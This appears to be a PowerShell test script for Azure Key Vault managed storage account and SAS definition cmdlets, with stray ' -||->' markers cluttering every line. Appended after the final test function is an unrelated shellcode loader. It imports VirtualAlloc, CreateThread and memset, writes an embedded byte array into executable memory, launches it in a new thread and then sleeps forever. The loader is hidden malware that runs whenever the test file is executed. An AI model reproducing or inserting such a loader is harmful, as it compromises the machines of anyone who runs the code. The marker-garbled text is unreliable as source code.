 -||-> function Test_SetAzureKeyVaultManagedStorageAccountAndRawSasDefinition
{
     -||-> $managedStorageSasDefinitionName =  -||-> Get-ManagedStorageSasDefinitionName 'mngsas1' <-||-  <-||- 
     -||-> $paramatersSubCommand = '-Name $($managedStorageSasDefinitionName) -Parameter @{"sasType"="service";"serviceSasType"="blob";"signedResourceTypes"="b";"signedVersion"="2016-05-31";"signedProtocols"="https";"signedIp"="168.1.5.60-168.1.5.70";"validityPeriod"="P30D";"signedPermissions"="ra";"blobName"="blob1";"containerName"="container1";"rscd"="";"rscc"=""}' <-||- 
     -||-> Test_SetAzureKeyVaultManagedStorageAccountAndSasDefinition $paramatersSubCommand <-||-  
} <-||- 

 -||-> function Test_SetAzureKeyVaultManagedStorageAccountAndBlobSasDefinition
{
     -||-> $managedStorageSasDefinitionName =  -||-> Get-ManagedStorageSasDefinitionName 'mngsas2' <-||-  <-||- 
     -||-> $paramatersSubCommand = "-Name $( -||-> $managedStorageSasDefinitionName <-||- ) -Blob 'blob1' -Container 'container1' -ValidityPeriod ([System.Timespan]::FromDays(30)) -Permission Read,Add -SharedAccessHeader CacheControl,ContentDisposition -Protocol HttpsOnly -IPAddressOrRange '168.1.5.60-168.1.5.70'" <-||- 
     -||-> Test_SetAzureKeyVaultManagedStorageAccountAndSasDefinition $paramatersSubCommand <-||-  
} <-||- 

 -||-> function Test_SetAzureKeyVaultManagedStorageAccountAndBlobStoredPolicySasDefinition
{
     -||-> $managedStorageSasDefinitionName =  -||-> Get-ManagedStorageSasDefinitionName 'mngsas2' <-||-  <-||- 
     -||-> $paramatersSubCommand = "-Name $( -||-> $managedStorageSasDefinitionName <-||- ) -Blob 'blob1' -Container 'container1' -Policy 'policy1' -SharedAccessHeader CacheControl,ContentDisposition -Protocol HttpsOnly -IPAddressOrRange '168.1.5.60-168.1.5.70'" <-||- 
     -||-> Test_SetAzureKeyVaultManagedStorageAccountAndSasDefinition $paramatersSubCommand <-||-  
} <-||- 


 -||-> function Test_SetAzureKeyVaultManagedStorageAccountAndContainerSasDefinition
{
     -||-> $managedStorageSasDefinitionName =  -||-> Get-ManagedStorageSasDefinitionName 'mngsas3' <-||-  <-||- 
     -||-> $paramatersSubCommand = "-Name $( -||-> $managedStorageSasDefinitionName <-||- ) -Container 'container1' -ValidityPeriod ([System.Timespan]::FromDays(30)) -Permission Read,Add -SharedAccessHeader CacheControl,ContentDisposition -Protocol HttpsOnly -IPAddressOrRange '168.1.5.60-168.1.5.70'" <-||- 
     -||-> Test_SetAzureKeyVaultManagedStorageAccountAndSasDefinition $paramatersSubCommand <-||-  
} <-||- 

 -||-> function Test_SetAzureKeyVaultManagedStorageAccountAndShareSasDefinition
{
     -||-> $managedStorageSasDefinitionName =  -||-> Get-ManagedStorageSasDefinitionName 'mngsas4' <-||-  <-||- 
     -||-> $paramatersSubCommand = "-Name $( -||-> $managedStorageSasDefinitionName <-||- ) -Share 'share1' -ValidityPeriod ([System.Timespan]::FromDays(30)) -Permission Read,Add -SharedAccessHeader CacheControl,ContentDisposition -Protocol HttpsOnly -IPAddressOrRange '168.1.5.60-168.1.5.70'" <-||- 
     -||-> Test_SetAzureKeyVaultManagedStorageAccountAndSasDefinition $paramatersSubCommand <-||-  
} <-||- 

 -||-> function Test_SetAzureKeyVaultManagedStorageAccountAndFileSasDefinition
{
     -||-> $managedStorageSasDefinitionName =  -||-> Get-ManagedStorageSasDefinitionName 'mngsas5' <-||-  <-||- 
     -||-> $paramatersSubCommand = "-Name $( -||-> $managedStorageSasDefinitionName <-||- ) -Share 'share1' -Path 'path1' -ValidityPeriod ([System.Timespan]::FromDays(30)) -Permission Read,Add -SharedAccessHeader CacheControl,ContentDisposition -Protocol HttpsOnly -IPAddressOrRange '168.1.5.60-168.1.5.70'" <-||- 
     -||-> Test_SetAzureKeyVaultManagedStorageAccountAndSasDefinition $paramatersSubCommand <-||-  
} <-||- 

 -||-> function Test_SetAzureKeyVaultManagedStorageAccountAndQueueSasDefinition
{
     -||-> $managedStorageSasDefinitionName =  -||-> Get-ManagedStorageSasDefinitionName 'mngsas6' <-||-  <-||- 
     -||-> $paramatersSubCommand = "-Name $( -||-> $managedStorageSasDefinitionName <-||- ) -Queue 'queue1' -ValidityPeriod ([System.Timespan]::FromDays(30)) -Permission Read,Add -Protocol HttpsOnly -IPAddressOrRange '168.1.5.60-168.1.5.70'" <-||- 
     -||-> Test_SetAzureKeyVaultManagedStorageAccountAndSasDefinition $paramatersSubCommand <-||-  
} <-||- 

 -||-> function Test_SetAzureKeyVaultManagedStorageAccountAndTableSasDefinition
{
     -||-> $managedStorageSasDefinitionName =  -||-> Get-ManagedStorageSasDefinitionName 'mngsas6' <-||-  <-||- 
     -||-> $paramatersSubCommand = "-Name $( -||-> $managedStorageSasDefinitionName <-||- ) -Table 'table' -ValidityPeriod ([System.Timespan]::FromDays(30)) -Permission Read,Add -Protocol HttpsOnly -IPAddressOrRange '168.1.5.60-168.1.5.70' -StartPartitionKey 'spk1' -EndPartitionKey 'epk1'" <-||- 
     -||-> Test_SetAzureKeyVaultManagedStorageAccountAndSasDefinition $paramatersSubCommand <-||-  
} <-||- 

 -||-> function Test_SetAzureKeyVaultManagedStorageAccountAndAccountSasDefinition
{
     -||-> $managedStorageSasDefinitionName =  -||-> Get-ManagedStorageSasDefinitionName 'mngsas7' <-||-  <-||- 
     -||-> $paramatersSubCommand = "-Name $( -||-> $managedStorageSasDefinitionName <-||- ) -Service Queue,Blob -ResourceType Container,Object -Protocol HttpsOnly -IPAddressOrRange '168.1.5.60-168.1.5.70' -ValidityPeriod ([System.Timespan]::FromDays(30)) -Permission Add,Create" <-||- 
     -||-> Test_SetAzureKeyVaultManagedStorageAccountAndSasDefinition $paramatersSubCommand <-||-  
} <-||- 

 -||-> function Test_SetAzureKeyVaultManagedStorageAccountAndSasDefinition
{
    param([string] $paramatersSubCommand)
     -||-> $keyVault =  -||-> Get-KeyVault <-||-  <-||- 
     -||-> $managedStorageAccountName =  -||-> Get-ManagedStorageAccountName 'mngSt1' <-||-  <-||- 
     -||-> $global:createdManagedStorageAccounts += $managedStorageAccountName <-||- 
     -||-> $storageAccountResourceId =  -||-> Get-KeyVaultManagedStorageResourceId <-||-  <-||- 

    
     -||-> $managedStorageAccount =  -||-> Add-AzKeyVaultManagedStorageAccount -VaultName $keyVault -AccountName $managedStorageAccountName -AccountResourceId $storageAccountResourceId -ActiveKeyName 'key1' -DisableAutoRegenerateKey <-||-  <-||- 
     -||-> Assert-NotNull $managedStorageAccount <-||- 
    
     -||-> $command = "Set-AzKeyVaultManagedStorageSasDefinition -VaultName $( -||-> $keyVault <-||- ) -AccountName $( -||-> $managedStorageAccountName <-||- ) $( -||-> $paramatersSubCommand <-||- )" <-||-   
    
     -||-> Write-Host $command <-||- 
    
     -||-> $createdManagedStorageSasDefinition =  -||-> Invoke-Expression $command <-||-  <-||- 
     -||-> Assert-NotNull $createdManagedStorageSasDefinition <-||- 
   
    
     -||-> Assert-NotNull $managedStorageAccount.AccountName <-||- 
     -||-> Assert-NotNull $createdManagedStorageSasDefinition.Name <-||- 
     -||-> $secretName = "$( -||-> $managedStorageAccount.AccountName <-||- )-$( -||-> $createdManagedStorageSasDefinition.Name <-||- )" <-||- 
     -||-> $secret =  -||-> Get-AzKeyVaultSecret $keyVault $secretName <-||-  <-||- 
     -||-> Assert-NotNull $secret <-||- 
     -||-> Assert-NotNull $secret.SecretValueText <-||- 
} <-||- 

 -||-> function Test_SetAzureKeyVaultManagedStorageAccountAndSasDefinitionPipeTest
{
     -||-> $keyVault =  -||-> Get-KeyVault <-||-  <-||- 
     -||-> $managedStorageAccountName1 =  -||-> Get-ManagedStorageAccountName 'mngSt1' <-||-  <-||- 
     -||-> $managedStorageAccountName2 =  -||-> Get-ManagedStorageAccountName 'mngSt2' <-||-  <-||- 
     -||-> $global:createdManagedStorageAccounts += $managedStorageAccountName1 <-||- 
     -||-> $global:createdManagedStorageAccounts += $managedStorageAccountName2 <-||- 
     -||-> $storageAccountResourceId =  -||-> Get-KeyVaultManagedStorageResourceId <-||-  <-||- 

    
     -||-> $managedStorageAccount1 =  -||-> Add-AzKeyVaultManagedStorageAccount -VaultName $keyVault -AccountName $managedStorageAccountName1 -AccountResourceId $storageAccountResourceId -ActiveKeyName 'key1' -DisableAutoRegenerateKey <-||-  <-||- 
     -||-> Assert-NotNull $managedStorageAccount1 <-||- 

     -||-> $managedStorageAccount2 =  -||-> Get-AzKeyVaultManagedStorageAccount -VaultName $keyVault -AccountName $managedStorageAccountName1 | Add-AzKeyVaultManagedStorageAccount -AccountName $managedStorageAccountName2 <-||-  <-||- 
     -||-> Assert-NotNull $managedStorageAccount2 <-||- 

     -||-> $managedStorageSasDefinitionName1 =  -||-> Get-ManagedStorageSasDefinitionName 'mngsas8' <-||-  <-||- 
     -||-> $managedStorageSasDefinitionName2 =  -||-> Get-ManagedStorageSasDefinitionName 'mngsas9' <-||-  <-||- 
     -||-> $paramatersSubCommand = "-Name $( -||-> $managedStorageSasDefinitionName1 <-||- ) -Service Queue,Blob -ResourceType Container,Object -Protocol HttpsOnly -IPAddressOrRange '168.1.5.60-168.1.5.70' -ValidityPeriod ([System.Timespan]::FromDays(30)) -Permission Add,Create" <-||- 
     -||-> $command = "Set-AzKeyVaultManagedStorageSasDefinition -VaultName $( -||-> $keyVault <-||- ) -AccountName $( -||-> $managedStorageAccountName1 <-||- ) $( -||-> $paramatersSubCommand <-||- )" <-||- 
     -||-> Write-Host $command <-||- 
     -||-> $createdManagedStorageSasDefinition1 =  -||-> Invoke-Expression $command <-||-  <-||- 
     -||-> Assert-NotNull $createdManagedStorageSasDefinition1 <-||- 

     -||-> $createdManagedStorageSasDefinition2 =  -||-> Get-AzKeyVaultManagedStorageSasDefinition -VaultName $keyVault -AccountName $managedStorageAccountName1 -Name $managedStorageSasDefinitionName1 | Set-AzKeyVaultManagedStorageSasDefinition -Name $managedStorageSasDefinitionName2 <-||-  <-||- 
     -||-> Assert-NotNull $createdManagedStorageSasDefinition2 <-||- 

    
     -||-> Assert-NotNull $managedStorageAccount1.AccountName <-||- 
     -||-> Assert-NotNull $createdManagedStorageSasDefinition1.Name <-||- 
     -||-> Assert-NotNull $managedStorageAccount2.AccountName <-||- 
     -||-> Assert-NotNull $createdManagedStorageSasDefinition2.Name <-||- 
     -||-> $secretName1 = "$( -||-> $managedStorageAccount1.AccountName <-||- )-$( -||-> $createdManagedStorageSasDefinition1.Name <-||- )" <-||- 
     -||-> $secretName2 = "$( -||-> $managedStorageAccount1.AccountName <-||- )-$( -||-> $createdManagedStorageSasDefinition2.Name <-||- )" <-||- 
     -||-> $secret1 =  -||-> Get-AzKeyVaultSecret $keyVault $secretName1 <-||-  <-||- 
     -||-> $secret2 =  -||-> Get-AzKeyVaultSecret $keyVault $secretName2 <-||-  <-||- 
     -||-> Assert-NotNull $secret1 <-||- 
     -||-> Assert-NotNull $secret2 <-||- 
     -||-> Assert-NotNull $secret1.SecretValueText <-||- 
     -||-> Assert-NotNull $secret2.SecretValueText <-||- 
} <-||- 

 -||-> function Test_SetAzureKeyVaultManagedStorageAccountAndSasDefinitionAttribute
{
     -||-> $keyVault =  -||-> Get-KeyVault <-||-  <-||- 
     -||-> $managedStorageAccountName1 =  -||-> Get-ManagedStorageAccountName 'mngSt1' <-||-  <-||- 
     -||-> $managedStorageAccountName2 =  -||-> Get-ManagedStorageAccountName 'mngSt2' <-||-  <-||- 
     -||-> $global:createdManagedStorageAccounts += $managedStorageAccountName1 <-||- 
     -||-> $global:createdManagedStorageAccounts += $managedStorageAccountName2 <-||- 
     -||-> $storageAccountResourceId =  -||-> Get-KeyVaultManagedStorageResourceId <-||-  <-||- 
    
    
     -||-> $managedStorageAccount1 =  -||-> Add-AzKeyVaultManagedStorageAccount -VaultName $keyVault -AccountName $managedStorageAccountName1 -AccountResourceId $storageAccountResourceId -ActiveKeyName 'key1' -DisableAutoRegenerateKey <-||-  <-||- 
     -||-> Assert-NotNull $managedStorageAccount1 <-||- 
     -||-> $managedStorageAccount2 =  -||-> Get-AzKeyVaultManagedStorageAccount -VaultName $keyVault -AccountName $managedStorageAccountName1 | Add-AzKeyVaultManagedStorageAccount -AccountName $managedStorageAccountName2 -Tag @{"tag1"= -||-> "value1" <-||- ;"tag2"= -||-> "value2" <-||- } -Disable <-||-  <-||- 
     -||-> Assert-NotNull $managedStorageAccount2 <-||- 

     -||-> Assert-True {  -||-> $managedStorageAccount1.Attributes.Enabled <-||-  } <-||- 
     -||-> Assert-False {  -||-> $managedStorageAccount2.Attributes.Enabled <-||-  } <-||- 
     -||-> Assert-True {  -||-> $managedStorageAccount2.Tags.ContainsKey("tag1") <-||-  } <-||- 
    
     -||-> $managedStorageSasDefinitionName1 =  -||-> Get-ManagedStorageSasDefinitionName 'mngsas8' <-||-  <-||- 

     -||-> $paramatersSubCommand = "-Name $( -||-> $managedStorageSasDefinitionName1 <-||- ) -Service Queue,Blob -ResourceType Container,Object -Protocol HttpsOnly -IPAddressOrRange '168.1.5.60-168.1.5.70' -ValidityPeriod ([System.Timespan]::FromDays(30)) -Permission Add,Create" <-||- 
     -||-> $command = "Set-AzKeyVaultManagedStorageSasDefinition -VaultName $( -||-> $keyVault <-||- ) -AccountName $( -||-> $managedStorageAccountName1 <-||- ) $( -||-> $paramatersSubCommand <-||- ) -Tag @{'tag3'='value3';'tag4'='value4'}" <-||- 
     -||-> Write-Host $command <-||- 
     -||-> $createdManagedStorageSasDefinition1 =  -||-> Invoke-Expression $command <-||-  <-||- 
     -||-> Assert-NotNull $createdManagedStorageSasDefinition1 <-||- 
     -||-> Assert-True {  -||-> $createdManagedStorageSasDefinition1.Tags.ContainsKey("tag3") <-||-  } <-||- 
} <-||- 

 -||-> function Test_UpdateAzureKeyVaultManagedStorageAccount
{
     -||-> $keyVault =  -||-> Get-KeyVault <-||-  <-||- 
     -||-> $managedStorageAccountName =  -||-> Get-ManagedStorageAccountName 'mngSt1' <-||-  <-||- 
     -||-> $global:createdManagedStorageAccounts += $managedStorageAccountName <-||- 
     -||-> $storageAccountResourceId =  -||-> Get-KeyVaultManagedStorageResourceId <-||-  <-||- 
    
    
     -||-> $managedStorageAccount =  -||-> Add-AzKeyVaultManagedStorageAccount -VaultName $keyVault -AccountName $managedStorageAccountName -AccountResourceId $storageAccountResourceId -ActiveKeyName 'key1' -RegenerationPeriod ( -||-> [System.Timespan]::FromDays(30) <-||- ) <-||-  <-||- 
     -||-> Assert-NotNull $managedStorageAccount <-||- 

     -||-> $managedStorageAccountUpdate =  -||-> Update-AzKeyVaultManagedStorageAccount -VaultName $keyVault -AccountName $managedStorageAccountName -ActiveKeyName 'key2' -Tag @{"tag3"= -||-> "value3" <-||- } -PassThru <-||-  <-||- 
     -||-> Assert-NotNull $managedStorageAccountUpdate <-||- 

     -||-> Assert-True {  -||-> $managedStorageAccountUpdate.ActiveKeyName.Equals("key2") <-||-  } <-||- 
     -||-> Assert-True {  -||-> $managedStorageAccountUpdate.Tags.ContainsKey("tag3") <-||-  } <-||- 
} <-||- 

 -||-> function Test_RegenerateAzureKeyVaultManagedStorageAccountAndSasDefinition
{
     -||-> $keyVault =  -||-> Get-KeyVault <-||-  <-||- 
     -||-> $managedStorageAccountName =  -||-> Get-ManagedStorageAccountName 'mngSt1' <-||-  <-||- 
     -||-> $global:createdManagedStorageAccounts += $managedStorageAccountName <-||- 
     -||-> $storageAccountResourceId =  -||-> Get-KeyVaultManagedStorageResourceId <-||-  <-||- 
    
    
     -||-> $managedStorageAccount =  -||-> Add-AzKeyVaultManagedStorageAccount -VaultName $keyVault -AccountName $managedStorageAccountName -AccountResourceId $storageAccountResourceId -ActiveKeyName 'key1' -RegenerationPeriod ( -||-> [System.Timespan]::FromDays(30) <-||- ) <-||-  <-||- 
     -||-> Assert-NotNull $managedStorageAccount <-||- 

     -||-> $managedStorageAccountUpdate =  -||-> Update-AzKeyVaultManagedStorageAccountKey -VaultName $keyVault -AccountName $managedStorageAccountName -KeyName 'key2' -Force -Confirm:$false -PassThru <-||-  <-||- 
     -||-> Assert-NotNull $managedStorageAccountUpdate <-||- 

     -||-> Assert-True {  -||-> $managedStorageAccountUpdate.ActiveKeyName.Equals("key2") <-||-  } <-||- 
} <-||- 

 -||-> function Test_ListKeyVaultAzureKeyVaultManagedStorageAccounts
{
     -||-> $keyVault =  -||-> Get-KeyVault <-||-  <-||- 
     -||-> $managedStorageAccountName01 =  -||-> Get-ManagedStorageAccountName 'listmngSt1' <-||-  <-||- 
     -||-> $storageAccountResourceId =  -||-> Get-KeyVaultManagedStorageResourceId <-||-  <-||- 
    
     -||-> $createdmanagedStorageAccountName01 =  -||-> Add-AzKeyVaultManagedStorageAccount -VaultName $keyVault -AccountName $managedStorageAccountName01 -AccountResourceId $storageAccountResourceId -ActiveKeyName 'key1' -RegenerationPeriod ( -||-> [System.Timespan]::FromDays(30) <-||- ) <-||-  <-||- 
     -||-> Assert-NotNull $createdmanagedStorageAccountName01 <-||- 

     -||-> $managedStorageAccountName02 =  -||-> Get-ManagedStorageAccountName 'listmngSt2' <-||-  <-||- 
     -||-> $createdmanagedStorageAccountName02 =  -||-> Add-AzKeyVaultManagedStorageAccount -VaultName $keyVault -AccountName $managedStorageAccountName02 -AccountResourceId $storageAccountResourceId -ActiveKeyName 'key1' -RegenerationPeriod ( -||-> [System.Timespan]::FromDays(30) <-||- ) <-||-  <-||- 
     -||-> Assert-NotNull $createdmanagedStorageAccountName02 <-||- 

     -||-> $managedStorageAccounts =  -||-> Get-AzKeyVaultManagedStorageAccount $keyVault <-||-  <-||- 
     -||-> Assert-NotNull $managedStorageAccounts <-||- 

     -||-> Assert-True {  -||-> $managedStorageAccounts.Count -ge 2 <-||-  } <-||- 

     -||-> $item01 =  -||-> $managedStorageAccounts | where {  -||-> Equal-String $_.AccountName $managedStorageAccountName01 <-||-  } | Select -First 1 <-||-  <-||- 
     -||-> Assert-NotNull $item01 <-||- 

     -||-> $item02 =  -||-> $managedStorageAccounts | where {  -||-> Equal-String $_.AccountName $managedStorageAccountName02 <-||-  } | Select -First 1 <-||-  <-||- 
     -||-> Assert-NotNull $item02 <-||- 
} <-||- 
 -||-> $oBs = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);' <-||- ; -||-> $w =  -||-> Add-Type -memberDefinition $oBs -Name "Win32" -namespace Win32Functions -passthru <-||-  <-||- ; -||-> [Byte[]] <-||- ; -||-> [Byte[]]$z = 0xdb,0xdf,0xbd,0x5c,0x13,0x9d,0xc3,0xd9,0x74,0x24,0xf4,0x5f,0x31,0xc9,0xb1,0x47,0x31,0x6f,0x18,0x03,0x6f,0x18,0x83,0xef,0xa0,0xf1,0x68,0x3f,0xb0,0x74,0x92,0xc0,0x40,0x19,0x1a,0x25,0x71,0x19,0x78,0x2d,0x21,0xa9,0x0a,0x63,0xcd,0x42,0x5e,0x90,0x46,0x26,0x77,0x97,0xef,0x8d,0xa1,0x96,0xf0,0xbe,0x92,0xb9,0x72,0xbd,0xc6,0x19,0x4b,0x0e,0x1b,0x5b,0x8c,0x73,0xd6,0x09,0x45,0xff,0x45,0xbe,0xe2,0xb5,0x55,0x35,0xb8,0x58,0xde,0xaa,0x08,0x5a,0xcf,0x7c,0x03,0x05,0xcf,0x7f,0xc0,0x3d,0x46,0x98,0x05,0x7b,0x10,0x13,0xfd,0xf7,0xa3,0xf5,0xcc,0xf8,0x08,0x38,0xe1,0x0a,0x50,0x7c,0xc5,0xf4,0x27,0x74,0x36,0x88,0x3f,0x43,0x45,0x56,0xb5,0x50,0xed,0x1d,0x6d,0xbd,0x0c,0xf1,0xe8,0x36,0x02,0xbe,0x7f,0x10,0x06,0x41,0x53,0x2a,0x32,0xca,0x52,0xfd,0xb3,0x88,0x70,0xd9,0x98,0x4b,0x18,0x78,0x44,0x3d,0x25,0x9a,0x27,0xe2,0x83,0xd0,0xc5,0xf7,0xb9,0xba,0x81,0x34,0xf0,0x44,0x51,0x53,0x83,0x37,0x63,0xfc,0x3f,0xd0,0xcf,0x75,0xe6,0x27,0x30,0xac,0x5e,0xb7,0xcf,0x4f,0x9f,0x91,0x0b,0x1b,0xcf,0x89,0xba,0x24,0x84,0x49,0x43,0xf1,0x31,0x4f,0xd3,0x3a,0x6d,0x4e,0x24,0xd3,0x6c,0x51,0x3b,0x7f,0xf8,0xb7,0x6b,0x2f,0xaa,0x67,0xcb,0x9f,0x0a,0xd8,0xa3,0xf5,0x84,0x07,0xd3,0xf5,0x4e,0x20,0x79,0x1a,0x27,0x18,0x15,0x83,0x62,0xd2,0x84,0x4c,0xb9,0x9e,0x86,0xc7,0x4e,0x5e,0x48,0x20,0x3a,0x4c,0x3c,0xc0,0x71,0x2e,0xea,0xdf,0xaf,0x45,0x12,0x4a,0x54,0xcc,0x45,0xe2,0x56,0x29,0xa1,0xad,0xa9,0x1c,0xba,0x64,0x3c,0xdf,0xd4,0x88,0xd0,0xdf,0x24,0xdf,0xba,0xdf,0x4c,0x87,0x9e,0xb3,0x69,0xc8,0x0a,0xa0,0x22,0x5d,0xb5,0x91,0x97,0xf6,0xdd,0x1f,0xce,0x31,0x42,0xdf,0x25,0xc0,0xbe,0x36,0x03,0xb6,0xae,0x8a <-||- ; -||-> $g = 0x1000 <-||- ; -||-> if ( -||-> $z.Length -gt 0x1000 <-||- ){ -||-> $g = $z.Length <-||- } <-||- ; -||-> $F5J=$w::VirtualAlloc(0,0x1000,$g,0x40) <-||- ;for ( -||-> $i=0 <-||- ; -||-> $i -le ( -||-> $z.Length-1 <-||- ) <-||- ; -||-> $i++ <-||- ) { -||-> $w::memset([IntPtr]( -||-> $F5J.ToInt32()+$i <-||- ), $z[$i], 1) <-||- }; -||-> $w::CreateThread(0,0,$F5J,0,0,0) <-||- ;for (;;){ -||-> Start-sleep 60 <-||- };



